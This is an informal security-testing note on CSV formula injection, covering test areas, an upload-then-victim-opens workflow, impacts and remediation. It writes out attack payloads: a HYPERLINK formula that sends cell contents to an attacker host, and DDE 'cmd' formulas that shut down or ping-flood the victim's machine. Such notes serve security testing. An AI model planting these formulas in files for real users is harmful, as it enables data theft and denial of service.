:::::::::::::::::::::::------------------------ Formula injection ............................>>>>>>>

CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files. When a spreadsheet program 
such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with = will be interpreted by the software as a formula.

==>> Areas to test csv injection >>>
1) file upload functionalities
2) file downoad functionalities
3) Export file/Data in csv format options etc.

workflow :-
steps :: -
1) let i logged into a website which have functionalities to upload/download file xls/xlsx using upload button.
2) let I upload one file which has malicious formula using upload button
3) once file upload is successfull my work is done
4) let user b logges in and download my file.
5) let he opened the file once he opened the injected formula is executed.

<<< IMPACT >>>
1) Hijacking the users computer by exploting vulnerabilities in the spreadsheets s/w such as cve-2014-3524
2) Hijacking the users computer by exploiting the user's tendency to ignore security warnings in spreadsheets 
   that they downloaded from their own website.
3) exfiltering contents from the spreadsheet or other open spreadsheet


Note: We are just demonstrating with calculator but in real time attacker can take the advantage of this vulnerability 
to shutdown server or ping server by executing OS command or attacker can exploit it on higher level, for example importing
files from server controlled by attacker. Following formula embed Hyperlink More Here in excel file and when user click on 
link information within selected cell send to attackers’ domain.
=HYPERLINK(“http://172.0.0.1:8000?leads="&A2&B2, “More here”)
Attacker can inject following command which will shut down victim’s server immediately and if victim would have 
some unsaved data then he/she will be lost data.
=cmd | ‘ /C shutdown /r ‘ ! ‘ A1 ‘
Attacker can ping server and flood server with so many ping requests do perform DOS attack.
=cmd|’/C ping -t 172.0.0.1 -l 25152'!’A1'


REMEDIATION :::::::::::::;;---

In excel workbook, any cell that start with =, -, +, or @ will be considered as formula. So, for any cell 
that begins with one of the formulae triggering characters =, -, +, or @, you should directly prefix it with a tab, 
apostrophe, or space character. Note that if there are quotes, this character goes inside of the quotes.

This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, 
ensure that no cells begin with any of the following characters:

Equals to (=)
Plus (+)
Minus (-)
At (@)
Tab (0x09)
Carriage return (0x0D)
